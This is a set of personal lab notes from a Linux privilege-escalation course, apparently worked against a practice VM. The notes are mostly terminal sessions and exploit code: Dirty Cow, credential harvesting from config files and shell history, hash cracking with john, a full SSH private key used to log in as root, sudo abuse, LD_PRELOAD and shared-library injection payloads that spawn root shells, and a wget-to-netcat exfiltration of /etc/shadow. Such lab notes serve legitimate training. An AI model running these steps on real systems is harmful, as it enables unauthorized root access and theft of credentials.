@@ -1,0 +1,358 @@
+Linux Privilege Escalation lessons by TCM
+
+IP: 10.10.107.211 
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/LinuxPrivEscalationTCM# ssh TCM@10.10.107.211 
+The authenticity of host '10.10.107.211 (10.10.107.211)' can't be established.
+RSA key fingerprint is SHA256:JwwPVfqC+8LPQda0B9wFLZzXCXcoAho6s8wYGjktAnk.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.107.211' (RSA) to the list of known hosts.
+TCM@10.10.107.211's password: 
+Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sat Oct  3 09:07:46 2020 from ip-10-100-1-183.eu-west-1.compute.internal
+TCM@debian:~$ id
+uid=1000(TCM) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
+TCM@debian:~$ 
+
+
+SO the first vulnerability to escalate the privileges is dirty cow which is pretty common in linux machines.
+
+1) Dirty Cow 
+
+TCM@debian:~/tools/dirtycow$ ls
+c0w.c
+TCM@debian:~/tools/dirtycow$ gcc -pthread c0w.c -o cow_to_root
+TCM@debian:~/tools/dirtycow$ ls
+c0w.c  cow_to_root
+TCM@debian:~/tools/dirtycow$ ./cow_to_root 
+                                
+   (___)                                   
+   (o o)_____/                             
+    @@ `     \                            
+     \ ____, //usr/bin/passwd                          
+     //    //                              
+    ^^    ^^                               
+DirtyCow root privilege escalation
+Backing up /usr/bin/passwd to /tmp/bak
+mmap cdad7000
+
+madvise 0
+
+ptrace 0
+
+TCM@debian:~/tools/dirtycow$ passwd
+root@debian:/home/user/tools/dirtycow# id
+uid=0(root) gid=1000(user) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
+root@debian:/home/user/tools/dirtycow# 
+
+
+2) Stored Config Files.
+
+Exploitation
+
+Linux VM
+
+1. In command prompt type: cat /home/user/myvpn.ovpn
+2. From the output, make note of the value of the “auth-user-pass” directive.
+3. In command prompt type: cat /etc/openvpn/auth.txt
+4. From the output, make note of the clear-text credentials.
+5. In command prompt type: cat /home/user/.irssi/config | grep -i passw
+6. From the output, make note of the clear-text credentials.
+
+
+3) .bash_history File
+
+TCM@debian:~$ cat ~/.bash_history | grep -i passw
+mysql -h somehost.local -uroot -ppassword123
+cat /etc/passwd | cut -d: -f1
+awk -F: '($3 == "0") {print}' /etc/passwd
+TCM@debian:~$ 
+
+
+TCM@debian:~$ su root
+Password: 
+root@debian:/home/user# id
+uid=0(root) gid=0(root) groups=0(root)
+root@debian:/home/user# 
+
+4) Shadow and Passwd file 
+
+we can use unshadow followed by john the ripper to get the root or any other user password with higher privileges.
+
+unshadow passwd shadow -o unshadowed.txt
+
+john unshadowed.txt --wordlist=/home/akshay/Downloads/rockyou.txt
+
+5) SSH keys
+
+TCM@debian:~$ find / -name authorized_keys 2>/dev/null
+TCM@debian:~$ find / -name id_rsa 2>/dev/null
+/backups/supersecretkeys/id_rsa
+TCM@debian:~$ cd /backups/supersecretkeys/id_rsa
+-bash: cd: /backups/supersecretkeys/id_rsa: Not a directory
+TCM@debian:~$ cd /backups/supersecretkeys
+TCM@debian:/backups/supersecretkeys$ ls
+id_rsa
+TCM@debian:/backups/supersecretkeys$ cat id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+STOMIZSSBDSfkAAAAJcm9vdEBrYWxpAQI=
+-----END OPENSSH PRIVATE KEY-----
+TCM@debian:/backups/supersecretkeys$ 
+
+
+root@LAPTOP-U5913CMD:/home/akshay# chmod 600 lol
+root@LAPTOP-U5913CMD:/home/akshay# ssh -i lol root@10.10.107.211
+Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Wed Jun 17 23:31:40 2020 from 192.168.4.51
+root@debian:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@debian:~# 
+
+
+6) Find command as sudo 
+TCM@debian:/backups/supersecretkeys$ sudo -l
+Matching Defaults entries for TCM on this host:
+    env_reset, env_keep+=LD_PRELOAD
+
+User TCM may run the following commands on this host:
+    (root) NOPASSWD: /usr/sbin/iftop
+    (root) NOPASSWD: /usr/bin/find
+    (root) NOPASSWD: /usr/bin/nano
+    (root) NOPASSWD: /usr/bin/vim
+    (root) NOPASSWD: /usr/bin/man
+    (root) NOPASSWD: /usr/bin/awk
+    (root) NOPASSWD: /usr/bin/less
+    (root) NOPASSWD: /usr/bin/ftp
+    (root) NOPASSWD: /usr/bin/nmap
+    (root) NOPASSWD: /usr/sbin/apache2
+    (root) NOPASSWD: /bin/more
+TCM@debian:/backups/supersecretkeys$ sudo /usr/bin/find . -exec "/bin/sh" \;
+sh-4.1# id
+uid=0(root) gid=0(root) groups=0(root)
+sh-4.1# 
+
+Apache2 command as sudo
+
+TCM@debian:/backups/supersecretkeys$ sudo -l
+Matching Defaults entries for TCM on this host:
+    env_reset, env_keep+=LD_PRELOAD
+
+User TCM may run the following commands on this host:
+    (root) NOPASSWD: /usr/sbin/iftop
+    (root) NOPASSWD: /usr/bin/find
+    (root) NOPASSWD: /usr/bin/nano
+    (root) NOPASSWD: /usr/bin/vim
+    (root) NOPASSWD: /usr/bin/man
+    (root) NOPASSWD: /usr/bin/awk
+    (root) NOPASSWD: /usr/bin/less
+    (root) NOPASSWD: /usr/bin/ftp
+    (root) NOPASSWD: /usr/bin/nmap
+    (root) NOPASSWD: /usr/sbin/apache2
+    (root) NOPASSWD: /bin/more
+TCM@debian:/backups/supersecretkeys$ /usr/sbin/apache2
+apache2: bad user name ${APACHE_RUN_USER}
+TCM@debian:/backups/supersecretkeys$ /usr/sbin/apache2 -f /etc/shadow
+Syntax error on line 1 of /etc/shadow:
+Invalid command 'root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::', perhaps misspelled or defined by a module not included in the server configuration
+TCM@debian:/backups/supersecretkeys$ 
+
+7) Environment variables
+
+Detection
+
+Linux VM
+
+1. In command prompt type: sudo -l
+2. From the output, notice that the LD_PRELOAD environment variable is intact.
+
+Exploitation
+
+1. Open a text editor and type:
+
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+    unsetenv("LD_PRELOAD");
+    setgid(0);
+    setuid(0);
+    system("/bin/bash");
+}
+
+2. Save the file as x.c
+3. In command prompt type:
+gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles
+4. In command prompt type:
+sudo LD_PRELOAD=/tmp/x.so apache2
+5. In command prompt type: id
+
+
+8) Just a little bit off the course.
+
+We can even use wget to view the sensitive files in a particular system.
+
+like we can setup a netcat listener on our machine and use wget to post file to our machine.
+
+sudo wget --post-file=/etc/shadow IP 1234
+
+
+Attackers machine:
+
+nc -nvlp 1234
+
+This can be done :)
+
+9) SUID and SGID bit via shared injection
+/usr/local/bin/suid-so has SUID bit set
+
+TCM@debian:~$ strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
+access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
+open("/etc/ld.so.cache", O_RDONLY)      = 3
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+open("/lib/libdl.so.2", O_RDONLY)       = 3
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+open("/usr/lib/libstdc++.so.6", O_RDONLY) = 3
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+open("/lib/libm.so.6", O_RDONLY)        = 3
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+open("/lib/libgcc_s.so.1", O_RDONLY)    = 3
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+open("/lib/libc.so.6", O_RDONLY)        = 3
+open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)
+TCM@debian:~$ 
+
+As you can see it opens the /home/user/.config/libcalc.c file and then it displays the error cannot open the file as it doesnt exists.
+
+So we can write some malicious code to that file and store it in the .config folder.
+
+
+#include <stdio.h>
+#include <stdlib.h>
+
+static void inject()__attribute__((constructor));
+
+void inject(){
+        system("cp /bin/bash /tmp/bash && chmod u+s /tmp/bash && /tmp/bash -p");
+}
+ 
+
+We can write this code and then compile it as libcalc.so
+
+Make sure that the user directory or wherever you are carrying out these stuffs should be writable.
+TCM@debian:~$ mkdir /home/user/.config
+TCM@debian:~$ gcc -fPIC -shared -o /home/user/.config/libcalc.so /home/user/libcalc.c 
+TCM@debian:~$ /usr/local/bin/suid-so 
+Calculating something, please wait...
+bash-4.1# id
+uid=1000(TCM) gid=1000(user) euid=0(root) egid=50(staff) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
+bash-4.1# 
+
+We get access as root.
+
+10) SUID env -2 
+
+
+TCM@debian:/tmp$ find / -perm -u=s -type f 2>/dev/null
+/usr/bin/chsh
+/usr/bin/sudo
+/usr/bin/newgrp
+/usr/bin/sudoedit
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/chfn
+/usr/local/bin/suid-so
+/usr/local/bin/suid-env
+/usr/local/bin/suid-env2
+/usr/sbin/exim-4.84-3
+/usr/lib/eject/dmcrypt-get-device
+
+We can use /usr/local/bin/suid-env2
+
+TCM@debian:/tmp$ strings /usr/local/bin/suid-env2
+/lib64/ld-linux-x86-64.so.2
+__gmon_start__
+libc.so.6
+setresgid
+setresuid
+system
+__libc_start_main
+GLIBC_2.2.5
+fff.
+fffff.
+l$ L
+t$(L
+|$0H
+/usr/sbin/service apache2 start
+TCM@debian:/tmp$ 
+
+Now this time it has specified the exact location of the binary service.
+
+WE can use function to carry out the malicious stuff.
+
+TCM@debian:/tmp$ function /usr/sbin/service() { cp /bin/bash /tmp/bash && chmod u+s /tmp/bash && /tmp/bash -p ;}
+TCM@debian:/tmp$ /usr/local/bin/suid-env2
+root@debian:/tmp# id
+uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
+root@debian:/tmp# 
+
+
+Cool.
+
+
+11) Capabilities escalation
+
+Command to identify - 
+
+getcap -r / 2>/dev/null
